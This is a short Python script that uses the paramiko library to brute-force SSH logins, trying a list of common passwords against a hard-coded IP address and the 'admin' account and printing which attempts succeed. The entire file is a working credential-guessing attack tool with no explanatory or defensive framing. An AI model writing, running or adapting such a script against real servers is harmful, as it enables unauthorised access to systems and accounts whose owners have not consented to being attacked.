
import paramiko

def ssh_bruteforce(ip, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            ssh.connect(ip, username=username, password=password, timeout=3)
            print(f"[+] Success: {username}:{password}")
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            print(f"[-] Failure: {password}")
        except Exception as e:
            print(f"[!] Connection Error: {e}")
            break
    return False

if __name__ == "__main__":
    ip = "192.168.1.100"  # target IP
    username = "admin"     # target user
    password_list = ["123456", "admin123", "password", "13579"]

    ssh_bruteforce(ip, username, password_list) 